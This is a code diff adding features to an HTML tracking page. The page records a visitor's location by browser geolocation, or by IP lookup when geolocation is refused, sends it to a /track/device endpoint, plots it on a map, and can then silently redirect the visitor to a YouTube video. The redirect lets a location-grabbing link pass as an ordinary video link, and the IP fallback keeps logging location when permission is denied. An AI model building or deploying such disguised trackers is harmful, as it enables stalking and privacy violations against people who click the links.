@@ -1,30 +1,91 @@
 <!DOCTYPE html>
 <html>
-<head><title>Tracking Page</title></head>
+<head>
+  <title>Tracking Page</title>
+  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" crossorigin=""/>
+  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js" crossorigin=""></script>
+  <style>
+    #map { height: 320px; width: 100%; display: none; margin-top: 8px; }
+  </style>
+</head>
 <body>
   <h2>Tracking Page</h2>
   <p id="short"></p>
+  <div id="map" aria-label="Location map"></div>
+  <div id="map-status" style="display:none; color:#555; margin-top:8px;"></div>
+
   <script>
-    function postShortLink(lat, lon){
-      fetch('/track/device', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({latitude: lat, longitude: lon})})
-      .then(r => r.text())
-      .then(c => { document.getElementById('short').innerText = 'Short Link: http://localhost:8080/' + c; });
+    const urlParams = new URLSearchParams(window.location.search);
+    const shouldRedirect = urlParams.get('redirectYoutube') === 'true';
+    const youtubeUrl = urlParams.get('youtubeUrl') || 'https://www.youtube.com/watch?v=mYRV_B_QVGw';
+
+    let mapInstance = null;
+    function showMap(lat, lon) {
+      if (lat == null || lon == null) return;
+      const el = document.getElementById('map');
+      el.style.display = 'block';
+      if (!mapInstance) {
+        mapInstance = L.map('map').setView([lat, lon], 12);
+        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+          attribution: '© OpenStreetMap contributors'
+        }).addTo(mapInstance);
+        L.marker([lat, lon]).addTo(mapInstance);
+      } else {
+        mapInstance.setView([lat, lon], 12);
+        L.marker([lat, lon]).setLatLng([lat, lon]).addTo(mapInstance);
+      }
     }
 
-    if ('geolocation' in navigator) {
-      navigator.geolocation.getCurrentPosition(function(pos){
-        postShortLink(pos.coords.latitude, pos.coords.longitude);
-      }, function(err){
-        // fallback to simple IP-based tracking
-        fetch('/track/device')
-          .then(r => r.text())
-          .then(c => { document.getElementById('short').innerText = 'Short Link: http://localhost:8080/' + c; });
+    function postShortLinkFromCoords(lat, lon){
+      fetch('/track/device', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({latitude: lat, longitude: lon})})
+      .then(r => r.text())
+      .then(c => {
+        const short = 'Short Link: http://localhost:8080/' + c;
+        document.getElementById('short').innerText = short;
+        showMap(lat, lon);
+        if (shouldRedirect) window.location.href = youtubeUrl;
       });
-    } else {
-      fetch('/track/device')
-        .then(r => r.text())
-        .then(c => { document.getElementById('short').innerText = 'Short Link: http://localhost:8080/' + c; });
     }
+
+    function postShortLinkFromIP(){
+      fetch('/track/device', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({})})
+        .then(r => r.text())
+        .then(shortCode => {
+          const short = 'Short Link: http://localhost:8080/' + shortCode;
+          document.getElementById('short').innerText = short;
+          // Try to obtain IP-based coordinates for a map
+          fetch('/track/mapdata', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({})})
+            .then(r => r.json())
+            .then(data => {
+              const lat = data.lat;
+              const lon = data.lon;
+              if (Number.isFinite(lat) && Number.isFinite(lon)) {
+                showMap(lat, lon);
+              } else {
+                const status = document.getElementById('map-status');
+                status.style.display = 'block';
+                status.innerText = 'Location could not be determined from IP. Map is unavailable.';
+              }
+              if (Number.isFinite(lat) && Number.isFinite(lon) && shouldRedirect) {
+                window.location.href = youtubeUrl;
+              }
+            })
+        });
+    }
+
+    document.addEventListener('DOMContentLoaded', function(){
+      if ('geolocation' in navigator) {
+        navigator.geolocation.getCurrentPosition(function(pos){
+          postShortLinkFromCoords(pos.coords.latitude, pos.coords.longitude);
+        }, function(){
+          // fallback to IP-based tracking when geolocation fails or is blocked
+          postShortLinkFromIP();
+        });
+      } else {
+        // no geolocation support
+        postShortLinkFromIP();
+      }
+    });
   </script>
 </body>
 </html>
